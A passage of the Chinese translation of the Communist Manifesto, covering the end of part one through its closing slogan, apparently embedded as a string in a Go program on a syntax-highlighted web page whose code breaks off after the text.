在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都有是一样的，都使无产者失去了任何民族性。法律、道德、宗教在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。\n　　 过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。\n　　 过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。\n　　 如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。\n　　 在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。\n　　 我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社成员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当作支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生存下去了，就是说，它的生存不再同社会相容了。\n　　 资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。\n\n\n二、无产者和共产党人\n\n共产党人同全体无产者的关系是怎样的呢？\n　　 共产党人不是同其他工人政党相对立的特殊政党。\n　　 他们没有任何同整个无产阶级的利益不同的利益。\n　　 他们不提出任何特殊的原则，用以塑造无产阶级的运动。\n　　 共产党人同其他无产阶级政党不同的地方只是：一方面，在无产者不同的民族的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。\n　　 因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。\n　　 共产党人的最近目的是和其他一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。\n　　 共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。\n　　 这些原理 不过是现存的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。\n　　 一切所有制关系都经历了经常的历史更替、经常的历史变更。\n　　 例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。\n　　 共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。\n　　 但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又完备的表现。\n　　 从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。\n　　 有人责备我们共产党人，说我们消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。\n　　 好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级财产出现以前的那种小资产阶级、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。\n　　 或者，你们说的是现代的资产阶级的私有财产吧？\n　　 但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增殖的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。\n　　 做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。\n　　 因此，资本不是一种个人力量，而是一种社会力量。\n　　 因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这里所改变的只是财产的社会性质。它将失掉它的阶级性质。\n　　 现在，我们来看看雇佣劳动。\n　　 雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。\n　　 在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。\n　　 因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。\n　　 而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。\n　　 在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。 　\n　　 但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也像我们的资产阶级的其他一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。\n　　 我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制这所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。\n　　 总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。\n　　 从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性被消灭了。\n　　 由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。\n　　 共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。\n　　 有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。\n　　 这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里劳者不获，获者不劳。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。\n　　 所有这些对共产主义的物质产品的占有方式和生产方式的责备，也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。\n　　 资产者唯恐失去的那种教育，绝大多数人来说是把人训练成机器。\n　　 但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正像你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件决定的。\n　　 你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。\n　　 消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。\n　　 现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。\n　　 资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。\n　　 你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。\n　　 但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。\n　　 而你们的教育不也是由社会决定的吗？不也是由你们进行教育时所处的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的作用；他们仅仅是要改变这种作用的性质，要使教育摆脱统治阶级的影响。\n　　 无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。\n　　 但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。\n　　 资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。\n　　 他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。\n　　 其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。\n　　 我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。 资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。\n　　 有人还责备共产党人，说他们要取消祖国，取消民族。\n　　 工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。\n　　 随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族分隔和对立日益消失。\n　　 无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。\n　　 人对人的剥削一消灭，民族对民族的剥削就会随之消灭。\n　　 民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。\n　　 从宗教的、哲学的和一切意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。\n　　 人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？\n　　 思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。\n　　 当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。\n　　 当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明竞争在信仰领域里占统治地位罢了。\n　　 “但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。\n　　 此外，还存在着一切社会状态所共有的永恒真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展相矛盾的。”\n　　 这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在不同的时代具有不同的形式。\n　　 但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。\n　　 共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。\n　　 不过，我们还是把资产阶级对共产主义的种种责难撇开吧。\n　　 前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。\n　　 无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。\n　　 要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。\n　　 这些措施在不同的国家里当然会是不同的。\n　　 但是，最先进的国家几乎都可以采取下面的措施：\n 1、剥夺地产，把地租用于国家支出。\n 2、征收高额累进税。\n 3、废除继承权。\n 4、没收一切流亡分子和叛乱分子的财产。\n 5、通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。\n 6、把全部运输业集中在国家的手里。\n 7、按照总的计划增加国家工厂和生产工具，开垦荒地和改良土壤。\n 8、实行普遍劳动义务制，成立产业军，特别是在农业方面。\n 9、把农业和工业结合起来，促使城乡对立逐步消灭。\n 10、对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。\n　　 当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立的存在条件，消灭阶级本身的存在条件，从而消灭了它自己这个阶级的统治。\n　　 代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。\n\n三、社会主义的和共产主义的文献\n\n1、反动的社会主义\n\n（甲）封建的社会主义\n　　 法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动 中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模作样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。\n　　 这样就产生了封建的社会主义，半是挽歌，半是谤文，半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论剌中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。\n　　 为了拉拢人民，贵族们把无产阶级的乞食袋当作旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。\n　　 一部分法国正统派和“青年英国”，都演过这出戏。\n　　 封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。\n　　 不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。\n　　 他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。\n　　 因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。\n　　 正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。\n　　 要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有财产，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣的圣水罢了。\n\n（乙）小资产阶级的社会主义\n\n　　 封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。\n　　 在现代文明已经发展的国家里，形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争抛到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。\n　　 在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。\n　　 这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。\n　　 但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。\n　　 工业中的行会制度，农业中的宗法经济，——这就是它的结论。\n　　 这一思潮在它以后的发展中变成了一种怯懦的悲叹。\n\n（丙）德国的或“真正的”社会主义\n\n　　 法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。\n　　 德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹的意志、本来的意志、真正人的意志的规律。\n　　 德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。\n　　 这种掌握，就像掌握外国语一样，是通过翻译的。\n　　 大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。\n　　 这种在法国人的论述下面塞进自己哲学词句的做法，他们称之为“行动的哲学”、”真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。\n　　 法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。\n　　 这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。\n　　 德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。\n　　 于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判（德国的社会主义是这种批判的可怜的回声）是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。\n　　 这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。\n　　 这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。\n　　 既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。\n　　 保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义像瘟疫一样流行起来了。\n　　 德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。\n　　 同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。\n　　 它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚地超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。\n\n2、保守的或资产阶级的社会主义\n　　 资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。\n　　 这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。\n　　 我们可以举蒲鲁东的《贫困的哲学》作为例子。\n　　 社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要抛弃他们关于这个社会的可恶的观念。\n　　 这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的废除，而是一些在这种生产关系的基础上实行的行政上的改良，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。\n　　 资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。\n　　 自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。\n　　 资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。\n\n3、批判的空想的社会主义和共产主义\n\n    在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献（巴贝夫等人的著作）。\n　　 无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。\n　　 本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了（见《资产阶级和无产阶级》）。\n　　 诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。\n　　 由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。\n　　 社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由一种特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。\n　　 诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们心目中，无产阶级只是一个受苦最深的阶级。\n　　 但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。\n　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。\n　　 这种对未来社会的幻想的描绘，在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，是同无产阶级对社会普遍改造的最初的本能的渴望相适应的。\n　　 但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。\n　　 批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。\n　　 因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。\n　　 在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。\n\n四、共产党人对各种反对党派的态度\n\n看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。\n　　 共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。\n　　 在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。\n　　 在波兰人中间，共产党人支持那个把土地革命当作民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。\n　　 在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。\n　　 但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。\n　　 共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。\n　　 总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。\n　　 在所有这些运动中，他们都强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。\n　　 最后，共产党人到处都努力争取全世界民主政党之间的团结和协调。\n　　 共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。\n\n全世界无产者，联合起来！\n&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> num2==<span class="hljs-number">5</span>&#123;<br>fmt.Println(<span 